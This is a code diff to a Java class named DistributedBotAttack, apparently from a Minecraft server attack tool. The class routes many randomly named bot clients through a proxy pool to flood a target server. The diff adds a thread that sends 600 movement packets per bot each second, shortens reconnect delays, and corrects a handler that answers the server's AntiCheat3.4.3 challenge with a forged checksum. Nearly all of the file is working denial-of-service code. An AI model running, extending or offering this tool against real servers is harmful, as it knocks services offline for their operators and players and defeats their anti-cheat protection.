@@ -2,8 +2,6 @@ package co.akarin.endminecraftultra.ATTACK;
 
 import java.io.InputStream;
 import java.io.OutputStream;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.Field;
 import java.net.InetSocketAddress;
 import java.net.Proxy;
 import java.net.Socket;
@@ -11,19 +9,15 @@ import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
 import java.util.concurrent.*;
-import java.util.logging.Logger;
+import java.util.concurrent.atomic.AtomicInteger;
 
 import co.akarin.endminecraftultra.Protocol.ACP;
 import co.akarin.endminecraftultra.Protocol.MCForge;
 import com.github.steveice10.mc.protocol.MinecraftProtocol;
 import com.github.steveice10.mc.protocol.packet.ingame.clientbound.*;
-import com.github.steveice10.mc.protocol.packet.ingame.clientbound.entity.ClientboundAnimatePacket;
-import com.github.steveice10.mc.protocol.packet.ingame.clientbound.entity.ClientboundMoveEntityPosPacket;
 import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundCustomPayloadPacket;
 import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundKeepAlivePacket;
-import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundPlayerAbilitiesPacket;
-import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundPlayerActionPacket;
-import com.github.steveice10.mc.protocol.packet.login.serverbound.ServerboundHelloPacket;
+import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundMovePlayerPosPacket;
 import com.github.steveice10.packetlib.ProxyInfo;
 import com.github.steveice10.packetlib.Session;
 import com.github.steveice10.packetlib.event.session.*;
@@ -32,21 +26,22 @@ import com.github.steveice10.packetlib.tcp.TcpClientSession;
 import com.github.steveice10.packetlib.tcp.TcpSession;
 import co.akarin.endminecraftultra.utils.mainUtils;
 import co.akarin.endminecraftultra.proxy.ProxyPool;
-import net.kyori.adventure.text.Component;
 
 public class DistributedBotAttack extends IAttack{
 
     private Thread mainThread;
     private Thread tabThread;
     private Thread taskThread;
-
+    private Thread packetFloodThread;
+    private boolean packetFlood = false;
     public final List<TcpSession> clients= new CopyOnWriteArrayList<>();
     public ExecutorService pool=Executors.newCachedThreadPool();
 
     private long starttime;
     private ACP acp=new ACP();
-    public DistributedBotAttack(int time,int maxconnect,int joinsleep,boolean motdbefore,boolean tab,HashMap<String,String> modList) {
+    public DistributedBotAttack(int time,int maxconnect,int joinsleep,boolean motdbefore,boolean tab,boolean packet1Flood,HashMap<String,String> modList) {
         super(time,maxconnect,joinsleep,motdbefore,tab,modList);
+        this.packetFlood = packet1Flood;
     }
 
     public void start(final String ip,final int port) {
@@ -56,8 +51,7 @@ public class DistributedBotAttack extends IAttack{
                 try {
                     cleanClients();
                     createClients(ip,port);
-                    mainUtils.sleep(10*1000);
-
+                    mainUtils.sleep(1*1000);
                     if(this.attack_time>0&&(System.currentTimeMillis()-this.starttime)/1000>this.attack_time) {
                         clients.forEach(c-> c.disconnect(""));
                         stop();
@@ -79,11 +73,28 @@ public class DistributedBotAttack extends IAttack{
                                 }
                             }
                         });
-                    mainUtils.sleep(10);
+                    mainUtils.sleep(6);
                 }
             });
         }
+        if(this.packetFlood){
+            packetFloodThread = new Thread(()->{
+                mainUtils.log("Client-Packet-Flooder-Worker","PacketFlooder started!");
+                while(true) {
+                    clients.forEach(c->{
+                        if(c.isConnected()) {
+                            if(c.hasFlag("join")) {
+                               packetFlood(c);
+                            }
+                        }
+                    });
+                    mainUtils.sleep(1000);
+                }
+
+            });
+        }
         mainThread.start();
+        if (this.packetFlood) packetFloodThread.start();
         if(tabThread!=null) tabThread.start();
         if(taskThread!=null) taskThread.start();
     }
@@ -94,7 +105,12 @@ public class DistributedBotAttack extends IAttack{
         if(tabThread!=null) tabThread.stop();
         if(taskThread!=null) taskThread.stop();
     }
-
+    public void packetFlood(Session session){
+        for (int i=0;i<600;i++){
+            session.send(new ServerboundMovePlayerPosPacket(true,0.01,0,0.01));
+        }
+        mainUtils.log("Flooder","Packet sending");
+    }
     public void setTask(Runnable task) {
         taskThread=new Thread(task);
     }
@@ -110,30 +126,29 @@ public class DistributedBotAttack extends IAttack{
     }
 
     private void createClients(final String ip,int port) {
-                ProxyPool.proxys.forEach(p->{
-                    try {
-                        String[] _p=p.split(":");
-                        ProxyInfo proxy=new ProxyInfo(ProxyInfo.Type.HTTP,new InetSocketAddress(_p[0],Integer.parseInt(_p[1])));
-                        Proxy p1 = new Proxy(Proxy.Type.HTTP,new InetSocketAddress(_p[0],Integer.parseInt(_p[1])));
-                        TcpSession client=createClient(ip, port,mainUtils.getRandomString(4,12),proxy);
-                        client.setReadTimeout(10*1000);
-                        client.setWriteTimeout(10*1000);
-                        clients.add(client);
-                        if(this.attack_motdbefore) {
-                            pool.submit(()->{
-                                getMotd(p1,ip,port);
-                                client.connect(false);
-                            });
-                        }else{
-                            client.connect(false);
-                        }
-
-                        if(this.attack_maxconnect>0&&(clients.size()>this.attack_maxconnect)) return;
-                        if(this.attack_joinsleep>0) mainUtils.sleep(attack_joinsleep);
-                    }catch(Exception e){
-                        mainUtils.log("BotThread/CreateClients",e.getMessage());
-                    }
-                });
+        ProxyPool.proxys.forEach(p -> {
+            try {
+                String[] _p = p.split(":");
+                ProxyInfo proxy = new ProxyInfo(ProxyInfo.Type.HTTP, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
+                Proxy p1 = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
+                TcpSession client = createClient(ip, port, mainUtils.getRandomString(4,12),proxy);
+                client.setReadTimeout(10 * 1000);
+                client.setWriteTimeout(10 * 1000);
+                clients.add(client);
+                if (this.attack_motdbefore) {
+                    pool.submit(() -> {
+                        getMotd(p1, ip, port);
+                        client.connect(false);
+                    });
+                } else {
+                    client.connect(false);
+                }
+                if (this.attack_maxconnect > 0 && (clients.size() > this.attack_maxconnect)) return;
+                if (this.attack_joinsleep > 0) mainUtils.sleep(attack_joinsleep);
+            } catch (Exception e) {
+                mainUtils.log("BotThread/CreateClients", e.getMessage());
+            }
+        });
     }
     public TcpClientSession createClient(final String ip, int port, final String username, ProxyInfo proxy) {
 
@@ -147,13 +162,13 @@ public class DistributedBotAttack extends IAttack{
                     long id = keepAlivePacket.getPingId()+1;
                     e.send(new ClientboundKeepAlivePacket(id));
                 }
-                if (packet instanceof ServerboundCustomPayloadPacket) {
-                    ServerboundCustomPayloadPacket packet1=(ServerboundCustomPayloadPacket)packet;
+                if (packet instanceof ClientboundCustomPayloadPacket) {
+                    ClientboundCustomPayloadPacket packet1=(ClientboundCustomPayloadPacket)packet;
                     switch(packet1.getChannel()) {
                         case "AntiCheat3.4.3":
-                            String code=acp.uncompress(((ServerboundCustomPayloadPacket) packet).getData());
+                            String code=acp.uncompress(((ClientboundCustomPayloadPacket) packet).getData());
                             byte[] checkData=acp.getCheckData("AntiCheat.jar",code,new String[] {"44f6bc86a41fa0555784c255e3174260"});
-                            e.send(new ClientboundCustomPayloadPacket("AntiCheat3.4.3",checkData));
+                            e.send(new ServerboundCustomPayloadPacket("AntiCheat3.4.3",checkData));
                             break;
                         default:
                     }
@@ -162,7 +177,6 @@ public class DistributedBotAttack extends IAttack{
                     e.setFlag("join",true);
                     mainUtils.log("Client","[连接成功]["+username+"]");
                 }
-                //System.out.println(packet.getClass().getName());
             }
             @Override
             public void packetSending(PacketSendingEvent event) {}
@@ -179,6 +193,7 @@ public class DistributedBotAttack extends IAttack{
                 }else{
                     msg=e.getReason();
                 }
+                clients.remove(e.getSession());
                 mainUtils.log("Client","[断开连接]["+username+"] " +msg);
             }
         });
